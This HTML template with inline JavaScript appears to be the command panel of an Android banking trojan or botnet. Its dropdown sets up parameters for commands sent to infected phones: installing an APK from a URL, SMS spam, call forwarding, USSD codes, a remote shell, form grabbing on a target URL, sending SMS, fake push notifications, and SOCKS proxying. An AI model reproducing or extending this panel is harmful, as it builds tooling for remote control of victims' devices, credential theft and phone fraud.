<!--<div id = "parent_com_modal">-->
	<script type="text/javascript">
	  function showOption(el) {
	  	  var id_div_param = document.getElementById("div_modal_params");
          if(el.options[el.selectedIndex].value == "sentUpdate"){
			   id_div_param.style.display = "block";
			   id_div_param.innerHTML = 'Name app<input type="text" id="modal_param1" ></input>Url apk<input type="text" id="modal_param2" ></input>';
		  }else if(el.options[el.selectedIndex].value == "startSpam"){
			   id_div_param.style.display = "block";
			   id_div_param.innerHTML = 'Start Spam<input type="text" id="modal_param1" ></input>';
		  }else if(el.options[el.selectedIndex].value == "startWeb"){
			   id_div_param.style.display = "block";
			   id_div_param.innerHTML = 'Start Web page<input type="text" id="modal_param1" ></input>';
		  }else if(el.options[el.selectedIndex].value == "startApp"){
			   id_div_param.style.display = "block";
			   id_div_param.innerHTML = 'Start App<input type="text" id="modal_param1" ></input>';
		  }else if(el.options[el.selectedIndex].value == "startNumber"){
			   id_div_param.style.display = "block";
			   id_div_param.innerHTML = 'Call number<input type="text" id="modal_param1" ></input>';
		  }else if(el.options[el.selectedIndex].value == "startForward"){
			   id_div_param.style.display = "block";
			   id_div_param.innerHTML = 'Call number<input type="text" id="modal_param1" ></input>';
		  }else if(el.options[el.selectedIndex].value == "resFwdCall"){
			   id_div_param.style.display = "block";
			   id_div_param.innerHTML = 'Number<input type="text" id="modal_param1" ></input>';
		  }else if(el.options[el.selectedIndex].value == "sendUSSD"){
			   id_div_param.style.display = "block";
			   id_div_param.innerHTML = 'Number<input type="text" id="modal_param1" ></input>';
		  }else if(el.options[el.selectedIndex].value == "startShell"){
			   id_div_param.style.display = "block";
			   id_div_param.innerHTML = 'CMD<input type="text" id="modal_param1" ></input>';
		  }else if(el.options[el.selectedIndex].value == "startFormgrab"){
			   id_div_param.style.display = "block";
			   id_div_param.innerHTML = 'Url<input type="text" id="modal_param1" ></input>';
		  }else if(el.options[el.selectedIndex].value == "sendSMS"){
			   id_div_param.style.display = "block";
			   id_div_param.innerHTML = 'Phone number<input type="text" id="modal_param1"></input>Text message<input type="text" id="modal_param2"></input>';
		  }else if(el.options[el.selectedIndex].value == "startPUSH"){
			   id_div_param.style.display = "block";
			   id_div_param.innerHTML = 'App<select id="modal_param1" >%%PLACE_APPLICATIONS_HERE%%</select>Title<input  type="text" id="modal_param2" ></input>Icon<input type="text" id="modal_param3"></input><!--Message<input type="text" id="modal_param4" ></input>-->';
		  } else if(el.options[el.selectedIndex].value == "startSocks"){
			   id_div_param.style.display = "block";
			   id_div_param.innerHTML = 'Proxy server<select id="modal_param1" >%%PLACE_PROXY_LIST_HERE%%</select>';
		  }else{
			  id_div_param.style.display = "none";
			  id_div_param.innerHTML = '';
		  }
	  }
	</script>
	<div id = "modal">
	<a id="exit" style="margin-left:97%; cursor: pointer; color: Red;" onclick="document.getElementById('commands_modal').style.display = 'none'";><i class="material-icons">highlight_off</i></a>
		<!--<div class="styled-select">-->

		<div> 
			%%PLACE_FORM1_HERE%%
			                       
			Select command
				<select  name="comboBox_commands" id="comboBox_commands" onchange="showOption(this)" >
                    %%PLACE_OPTIONS_HERE%%
				</select> 
				<button id='modal_command_btn' onclick='start_modal_command();' class="mdl-button mdl-js-button mdl-button--raised mdl-js-ripple-effect">Start command</button>
            <div >
				<div id="div_modal_params" style="display:none;"></div>
			</div>
			<br><br>
			<center>
				
			</center>
		</div>
	<!--</div>-->
<!--</div>-->